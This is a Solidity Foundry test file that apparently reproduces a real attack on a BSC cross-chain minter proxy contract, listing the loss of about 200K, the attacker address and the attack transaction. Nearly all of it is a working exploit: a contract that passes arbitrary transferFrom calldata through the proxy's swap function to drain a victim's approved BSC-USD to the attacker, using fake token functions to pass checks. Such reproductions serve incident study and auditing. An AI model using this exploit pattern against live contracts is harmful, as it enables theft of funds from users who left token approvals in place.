// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~200K
// Attacker : https://bscscan.com/address/0x69795d09aa99a305b4fc2ed158d4944bcd91d59a
// Attack Contract : https://bscscan.com/address/0x791c6542bc52efe4f20df0ee672b88579ae3fd9a
// Vulnerable Contract : https://bscscan.com/address/0x80a0d7a6fd2a22982ce282933b384568e5c852bf
// Attack Tx : https://bscscan.com/tx/0x051276afa96f2a2bd2ac224339793d82f6076f76ffa8d1b9e6febd49a4ec11b2

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x80a0d7a6fd2a22982ce282933b384568e5c852bf#code

// @Analysis
// Post-mortem :
// Twitter Guy :
// Hacking God :

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface MinterProxyV2 {
    function swap(
        address tokenAddr,
        uint256 amount,
        address target,
        address receiveToken,
        address receiver,
        uint256 minAmount,
        bytes calldata callData,
        bytes calldata order
    ) external payable;
}

contract Chainge is Test {
    address constant HACKER = 0x69795D09Aa99A305B4fC2eD158d4944bCd91D59A;
    address constant BSC_USD_ADDR = 0x55d398326f99059fF775485246999027B3197955;

    uint256 blocknumToForkFrom = 37_880_387;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
    }

    function testExploit() public {
        // Implement exploit code here
        uint256 balance;
        balance = IBEP20(BSC_USD_ADDR).balanceOf(HACKER);
        emit log_named_decimal_uint(
            "Attacker balance of Binance-Peg BSC-USD (BSC-USD) before exploit is %s", balance, IBEP20(BSC_USD_ADDR).decimals()
        );
        vm.startPrank(HACKER);
        Exploit exp = new Exploit();
        exp.exploit();
        vm.stopPrank();
        balance = IBEP20(BSC_USD_ADDR).balanceOf(HACKER);
        // Log balances after exploit
        emit log_named_decimal_uint(
            "Attacker balance of Binance-Peg BSC-USD (BSC-USD) after exploit is %s", balance, IBEP20(BSC_USD_ADDR).decimals()
        );
    }
}

contract Exploit is Test {
    /* Constant Variable */
    address constant VICTIM = 0x8A4AA176007196D48d39C89402d3753c39AE64c1;
    address constant MINT_PROXY_V2 = 0x80a0D7A6FD2A22982Ce282933b384568E5c852bF;
    address constant BSC_USD_ADDR = 0x55d398326f99059fF775485246999027B3197955;

    /* Immutable Variable */
    address immutable owner;

    /* State Variable */
    uint256 bal;

    constructor() payable {
        owner = msg.sender;
        bal = 10;
    }

    function exploit() external {
        uint256 amount;
        bytes memory data;

        uint256 BSC_USD_BALANCE = IBEP20(BSC_USD_ADDR).balanceOf(VICTIM);
        uint256 BSC_USD_ALLOWANCE = IBEP20(BSC_USD_ADDR).allowance(VICTIM, MINT_PROXY_V2);
        amount = BSC_USD_BALANCE > BSC_USD_ALLOWANCE? BSC_USD_ALLOWANCE : BSC_USD_BALANCE;
        data = abi.encodeWithSelector(0x23b872dd, VICTIM, owner, amount); // transferFrom function selector is 0x23b872dd

        MinterProxyV2(MINT_PROXY_V2).swap(
            address(this), 1, BSC_USD_ADDR, address(this), address(this), 1, data, new bytes(0x01)
        );
    }

    function balanceOf(address) external view returns (uint256) {
        uint256 BSC_USD_BALANCE = IBEP20(BSC_USD_ADDR).balanceOf(VICTIM);
        if (BSC_USD_BALANCE > 0) return 10;
        return 11;
    }

    function allowance(address, address) external view returns (uint256) {
        return 100;
    }

    function transfer(address, uint256) external returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        return true;
    }
}
